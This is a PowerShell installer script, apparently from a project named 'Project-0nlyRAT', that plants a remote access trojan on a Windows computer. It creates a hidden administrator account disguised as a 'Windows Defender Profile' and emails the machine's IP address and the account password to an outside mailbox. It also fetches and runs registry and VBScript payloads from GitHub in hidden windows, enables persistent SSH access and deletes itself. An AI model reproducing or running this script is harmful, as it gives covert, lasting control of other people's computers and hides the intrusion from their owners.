function random_text($len){
    return -join ((65..90) + (97..122)|Get-Random -Count $len|%{[char]$_})
}

# Create local admin for the rat
function create_account {
    [CmdletBinding()]
    param (
        [string] $xf061name,
        [securestring] $xf061pass
    )    
    begin {
    }    
    process {
        New-LocalUser "$xf061name" -Password $xf061pass -FullName "$xf061name" -Description "Windows Defender Profile" # can remove description parameter if want
        # Write-Verbose "$xf061name local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$xf061name"
        # Write-Verbose "$xf061name added to the local administrator group"
    }    
    end {
    }
}
# create admin user
$xf061name = "onlyrat"
$xf061RandPass = random_text(Get-Random -Minimum 6 -Maximum 19)
$xf061pass = (ConvertTo-SecureString $xf061RandPass -AsPlainText -Force)
create_account -xf061name $xf061name -xf061pass $xf061pass

# Variables
$directory = random_text(5)
$temp_dir = "$env:TEMP\$directory"
# save current directory
$curr_dir = Get-Location|%{$_.Path}

$email = Get-Content .\email.txt
$password = Get-Content .\password.txt
$config_file = "$env:username.rat"
$ip = (Get-NetIPAddress -AddressFamily IPv4|?{$_.InterfaceAlias -ne 'Loopback Pseudo-Interface 1'}).IPAddress|select -Last 1

# generate config file
Add-Content -Path $config_file -Value $ip
Add-Content -Path $config_file -Value $xf061RandPass
Add-Content -Path $config_file -Value $temp_dir
# Send Initial reconnaissance
powershell powershell.exe -noP -ep bypass -w hidden "{Send-MailMessage -from $email -to $email -subject $config_file -attachments $config_file -smtpserver 'smtp.gmail.com' -port '587' -usessl -credential (new-object -typename system.management.automation.pscredential -argumentlist $email ,(convertto-securestring -string '$password' -asplaintext -force))}"



# goto temp and make working directory
mkdir $temp_dir
cd $temp_dir

# Download registry to hide local admin
$reg_file = random_text(Get-Random -Minimum 6 -Maximum 13)
iwr -Uri "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/admin.reg" -OutFile ".\$reg_file.reg"

# Download VbScript file which will automate our registry entry
$vbs_file = random_text(Get-Random -Minimum 6 -Maximum 13)
iwr -Uri "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/confirm.vbs" -OutFile ".\$vbs_file.vbs"

# enable persistent ssh
# Install the OpenSSH Client
# Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0

# Install the OpenSSH Server feature
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0

# Start the OpenSSH Server service
Start-Service sshd

# Set the service to start automatically on boot
Set-Service -Name sshd -StartupType Automatic

# Verify that the service is running
# Get-NetFirewallRule -Name *ssh*

# execute the registry entry process
powershell -noP -ep bypass -w hidden Start-Process powershell.exe -windowstyle hidden ".\$reg_file.reg;.\$vbs_file.vbs"

# move to users to hide our onlyrat local admin
cd C:\Users
attrib +h +s +r ".\onlyrat"

# navigate to the saved directory and self delete
cd $curr_dir
del install.ps1